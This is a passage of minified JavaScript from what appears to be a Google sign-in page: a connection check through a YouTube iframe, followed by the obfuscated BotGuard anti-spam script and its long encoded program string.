var Gv=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].u(c,b);e++);}},Gw=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?(b&&(Gs=document.getElementById(b)),c&&(Gt=document.getElementById(c)),Gs||Gt?a=!0:(Gq.error("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Gq.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gu(a[d].iframeUri,a[d].domainSymbol));
Gh(window,"message",Gv(c));for(d=0;d<b;d++)c[d].l()}}}},Gx=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.f(Gw);G_setPostMessageSupportFlag=Gq.f(Gx);
</script>
  <script>
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.google.com\46v\0751511354291',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  connectivityElementId: 'dnConn',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */(function(){eval('var f=this,h=function(a,b,c,d,e){c=a.split("."),d=f,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||void 0===b?d=d[e]?d[e]:d[e]={}:d[e]=b},k=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},q=function(a,b,c){return 2>=arguments.length?p.slice.call(a,b):p.slice.call(a,b,c)},p=Array.prototype,r,v=(new function(){},function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b}),A=function(a,b,c,d,e,g){try{for(this.c=[],x(this,this.b,0),x(this,this.s,0),x(this,this.l,[]),x(this,this.C,0),x(this,this.m,2048),x(this,this.g,[]),x(this,this.j,y(4)),x(this,this.B,{}),x(this,this.aa,[]),x(this,this.ba,"object"==typeof window?window:f),x(this,this.L,0),x(this,this.K,0),x(this,this.da,this),x(this,this.D,0),b=0,this.H=true;64>b;++b);if(a&&"!"==a.charAt(0))this.u=a;else{if(window.atob){for(d=window.atob(a),a=[],e=b=0;e<d.length;e++){for(g=d.charCodeAt(e);255<g;)a[b++]=g&255,g>>=8;a[b++]=g}c=a}else c=null;(this.f=c)&&this.f.length?(this.U=[],this.I()):this.h(this.W)}}catch(l){z(this,l)}},B=(A.prototype.ra=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]}),y=(r=A.prototype,r.ca=16,function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b}),D=function(a,b,c,d){return c=a.a(a.b),a.f&&c<a.f.length?(x(a,a.b,a.f.length),C(a,b)):x(a,a.b,b),d=a.I(),x(a,a.b,c),d},x=(r.da=5,function(a,b,c){if(b==a.b||b==a.s)a.c[b]?a.c[b].na(c):a.c[b]=E(c);else if(b!=a.g&&b!=a.j&&b!=a.l||!a.c[b])a.c[b]=F(c,a.a);b==a.C&&(a.G=void 0,x(a,a.b,a.a(a.b)+4))}),H=(r.w=22,function(a,b,c,d,e,g){for(b={},c=G(a),b.T=G(a),b.o=[],d=G(a)-1,e=G(a),g=0;g<d;g++)b.o.push(G(a));for(b.R=a.a(c),b.S=a.a(e);d--;)b.o[d]=a.a(b.o[d]);return b}),I=(r.ga=10,r.l=4,r.L=2,A.prototype.pa=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},r.B=6,r.X=31,r.m=15,r.V=21,r.b=8,r.Y=33,r.K=1,function(a,b,c,d){for(d=b-1,c=[];0<=d;d--)c[b-1-d]=a>>8*d&255;return c}),K=(r.ha=42,r.P=[function(a,b,c,d){b=G(a),c=G(a),d=G(a),x(a,d,a.a(b)<<c)},function(a){J(a,4)},function(a,b,c,d,e){for(b=G(a),c=G(a)<<8|G(a),d=Array(c),e=0;e<c;e++)d[e]=G(a);x(a,b,d)},function(a,b,c,d){if(b=a.U.pop()){for(c=G(a);0<c;c--)d=G(a),b[d]=a.c[d];a.c=b}else x(a,a.b,a.f.length)},function(a,b,c,d){b=G(a),c=G(a),d=a.a(G(a)),c=a.a(c),x(a,b,K(a,c,d))},function(){},function(a){L(a,7)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),x(a,d,(a.a(b)in a.a(c))+0)},function(){},function(a,b,c){b=G(a),c=G(a),0!=a.a(b)&&x(a,a.b,a.a(c))},function(a,b,c){b=G(a),c=G(a),x(a,c,a.a(c)*a.a(b))},function(a,b,c,d){b=G(a),c=G(a),d=G(a),x(a,d,a.a(b)|a.a(c))},function(a,b,c,d,e){b=G(a),c=G(a),d=G(a),e=a.a(G(a)),c=a.a(c),d=a.a(d),a.a(b).addEventListener(c,K(a,d,e,true),false)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),a.a(b)>a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c){b=G(a),c=G(a),b=a.a(b),x(a,c,b)},function(a,b,c){b=G(a),c=G(a),x(a,c,a.a(c)-a.a(b))},function(a,b,c){b=G(a),c=G(a),x(a,c,""+a.a(b))},function(a){L(a,4)},function(a){M(a,4)},function(a){J(a,2)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),a.a(b)[a.a(c)]=a.a(d)},function(a,b,c,d,e,g,l,m,n){if(b=G(a),c=G(a)<<8|G(a),d="",void 0!=a.c[a.J])for(e=a.a(a.J);c--;)g=e[G(a)<<8|G(a)],d+=g;else{for(d=Array(c),e=0;e<c;e++)d[e]=G(a);for(c=[],g=e=0;e<d.length;)l=d[e++],128>l?c[g++]=String.fromCharCode(l):191<l&&224>l?(m=d[e++],c[g++]=String.fromCharCode((l&31)<<6|m&63)):(m=d[e++],n=d[e++],c[g++]=String.fromCharCode((l&15)<<12|(m&63)<<6|n&63));d=c.join("")}x(a,b,d)},function(a,b,c){b=G(a),c=G(a),x(a,c,function(a){return eval(a)}(a.a(b)))},function(a,b,c,d,e,g){if(b=G(a),c=G(a),d=G(a),e=G(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==k(b)){for(g in e=[],b)e.push(g);b=e}for(e=0,g=b.length;e<g;e+=d)c(b.slice(e,e+d),a)},function(a){L(a,3)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),c=a.a(c),b=a.a(b),x(a,d,b[c])},function(a){J(a,1)},function(a){L(a,0)},function(a,b){b=H(a),x(a,b.T,b.R.apply(b.S,b.o))},function(a,b,c,d){b=G(a),c=G(a),d=G(a),x(a,d,a.a(b)>>c)},function(a,b,c,d,e,g,l){b=H(a),e=b.R,d=b.S,c=b.o,l=c.length,0==l?g=new d[e]:1==l?g=new d[e](c[0]):2==l?g=new d[e](c[0],c[1]):3==l?g=new d[e](c[0],c[1],c[2]):4==l?g=new d[e](c[0],c[1],c[2],c[3]):a.h(a.w),x(a,b.T,g)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),x(a,d,a.a(b)||a.a(c))},function(a,b,c,d){b=G(a),c=G(a),d=G(a),a.a(b)==a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c){b=G(a),c=G(a),x(a,c,a.a(c)+a.a(b))},function(a,b){b=a.a(G(a)),C(a,b)},function(a){M(a,1)},function(a,b,c){b=G(a),c=G(a),b=a.a(b),x(a,c,k(b))},function(a){M(a,2)},function(a,b,c){b=G(a),c=G(a),x(a,c,a.a(c)%a.a(b))},function(a){G(a)}],function(a,b,c,d){return function(){if(!d||a.H)return x(a,a.ca,arguments),x(a,a.B,c),D(a,b)}}),G=(r.N="toString",function(a,b,c){if(b=a.a(a.b),!(b in a.f))throw a.h(a.X),a.A;return void 0==a.G&&(a.G=B(a.f,b-4),a.F=void 0),a.F!=b>>3&&(a.F=b>>3,c=[0,0,0,a.a(a.C)],a.ka=N(a.G,a.F,c)),x(a,a.b,b+1),a.f[b]^a.ka[b%8]}),N=function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}},E=(A.prototype.a=function(a,b){if(b=this.c[a],void 0===b)throw this.h(this.Z,0,a),this.A;return b()},r.D=13,r.ia=34,r.g=10,function(a,b,c){return c=function(){return a},b=function(){return c()},b.na=function(b){a=b},b}),z=(r.fa=12,function(a,b){a.u=("E:"+b.message+":"+b.stack).slice(0,2048)}),C=(r.s=0,r.W=17,r.j=7,r.A={},A.prototype.qa=function(a,b,c,d){try{d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)}catch(e){throw e;}},r.C=14,r.v="caller",r.ea=15,r.J=3,function(a,b){a.U.push(a.c.slice()),a.c[a.b]=void 0,x(a,a.b,b)}),O=(r.$=36,r.aa=12,r.M=11,function(a,b,c,d,e,g){for(e=a.a(b),b=b==a.j?function(b,c,d,g){if(c=e.length,d=c-4>>3,e.la!=d){e.la=d,d=(d<<3)-4,g=[0,0,0,a.a(a.L)];try{e.ja=N(B(e,d),B(e,d+4),g)}catch(t){throw t;}}e.push(e.ja[c&7]^b)}:function(a){e.push(a)},d&&b(d&255),g=0,d=c.length;g<d;g++)b(c[g])}),F=function(a,b,c,d,e,g,l,m,n){return d=function(){return c()},e=A.prototype,g=e.I,n=e.h,m=A,l=e.O,c=function(a,t,w){for(a=d[e.v],t=a===b,w=0,a=a&&a[e.v];a&&a!=g&&a!=l&&a!=m&&a!=n&&20>w;)w++,a=a[e.v];return c[e.ia+t+!(!a+(w+3>>3))]},d[e.N]=e,c[e.$]=a,a=void 0,d},P=(A.prototype.h=function(a,b,c,d){d=this.a(this.s),a=[a,d>>8&255,d&255],void 0!=c&&a.push(c),0==this.a(this.l).length&&(this.c[this.l]=void 0,x(this,this.l,a)),c="",b&&(b.message&&(c+=b.message),b.stack&&(c+=":"+b.stack)),b=this.a(this.m),3<b&&(c=c.slice(0,b-3),b-=c.length+3,c=v(c),O(this,this.j,I(c.length,2).concat(c),this.fa)),x(this,this.m,b)},r.Z=30,r.ba=9,function(a,b,c,d){if(8192>a.length)return String.fromCharCode.apply(null,a);for(c=0,b="";c<a.length;c+=8192)d=q(a,c,c+8192),b+=String.fromCharCode.apply(null,d);return b}),M=(A.prototype.oa=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),function(a,b,c,d){c=G(a),d=G(a),O(a,d,I(a.a(c),b))}),L=(A.prototype.O=function(a,b,c,d,e,g,l,m,n,u){if(this.u)return this.u;try{if(this.H=false,b=this.a(this.g).length,c=this.a(this.j).length,d=this.a(this.m),this.c[this.M]&&D(this,this.a(this.M)),e=this.a(this.l),0<e.length&&O(this,this.g,I(e.length,2).concat(e),this.ea),g=this.a(this.K)&255,g-=this.a(this.g).length+5,l=this.a(this.j),4<l.length&&(g-=l.length+3),0<g&&O(this,this.g,I(g,2).concat(y(g)),this.ga),4<l.length&&O(this,this.g,I(l.length,2).concat(l),this.ha),m=y(2).concat(this.a(this.g)),m[1]=m[0]^3,n=window.btoa?window.btoa(P(m)).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,""):void 0,n)n="!"+n;else for(e=0,n="";e<m.length;e++)u=m[e][this.N](16),1==u.length&&(u="0"+u),n+=u;this.a(this.g).length=b,this.a(this.j).length=c,x(this,this.m,d),a=n,this.H=true}catch(t){z(this,t),a=this.u}return a},function(a,b,c,d,e,g){d=b&3,c=b&4,e=G(a),g=G(a),e=a.a(e),c&&(e=v(""+e)),d&&O(a,g,I(e.length,2)),O(a,g,e)}),J=function(a,b,c,d){for(c=G(a),d=0;0<b;b--)d=d<<8|G(a);x(a,c,d)};A.prototype.ma=function(a,b){return b=this.O(),a&&a(b),b},A.prototype.I=function(a,b,c,d,e,g){try{for(d=0,c=void 0,b=5001,a=this.f.length;--b&&(d=this.a(this.b))<a;)try{x(this,this.s,d),e=G(this)%this.P.length,(c=this.P[e])?c(this):this.h(this.V,0,e)}catch(l){l!=this.A&&((g=this.a(this.D))?(x(this,g,l),x(this,this.D,0)):this.h(this.w,l))}b||this.h(this.Y)}catch(m){try{this.h(this.w,m)}catch(n){z(this,n)}}return this.a(this.B)};try{window.addEventListener("unload",function(){},false)}catch(Q){}h("botguard.bg",A),h("botguard.bg.prototype.invoke",A.prototype.ma);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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